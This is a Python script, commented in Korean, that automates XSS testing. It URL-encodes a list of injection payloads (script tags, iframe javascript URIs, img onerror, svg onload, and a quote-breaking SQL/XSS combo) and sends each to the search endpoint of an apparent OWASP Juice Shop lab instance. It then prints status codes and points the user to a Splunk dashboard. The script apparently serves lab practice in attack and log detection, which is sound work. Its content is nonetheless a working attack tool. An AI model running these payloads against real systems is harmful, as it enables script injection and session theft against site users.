import requests
import urllib.parse

# 1. 환경 설정 (사용자님의 설정에 맞게 수정)
TARGET_URL = "http://쥬스샵 사설 IP:3000/rest/products/search" # 쥬스샵 검색 API 경로
KALI_PUBLIC_IP = "15.165.205.92" # 스플렁크 로그 확인용 (필요시)

# 2. 테스트할 XSS 페이로드 목록
payloads = [
    "<iframe src='javascript:alert(\"XSS_Success\")'></iframe>",
    "<script>alert('Script_Injection');</script>",
    "<img src=x onerror=alert('Image_Error_XSS')>",
    "<svg/onload=alert('SVG_XSS')>",
    "';alert('SQL_XSS_Combo')--" # SQLi와 조합된 형태
]

def run_xss_automation():
    print(f"[*] Starting XSS Automation on {TARGET_URL}...")

    for i, payload in enumerate(payloads):
        # URL 인코딩 적용
        encoded_payload = urllib.parse.quote(payload)
        full_url = f"{TARGET_URL}?q={encoded_payload}"

        try:
            # GET 요청 전송
            response = requests.get(full_url, timeout=5)

            print(f"[{i+1}] Sent: {payload[:30]}...")
            print(f"    - Status Code: {response.status_code}")

        except Exception as e:
            print(f"[!] Error sending payload {i+1}: {e}")

    print("[*] Automation Finished. Check your Splunk Dashboard!")

if __name__ == "__main__":
    run_xss_automation()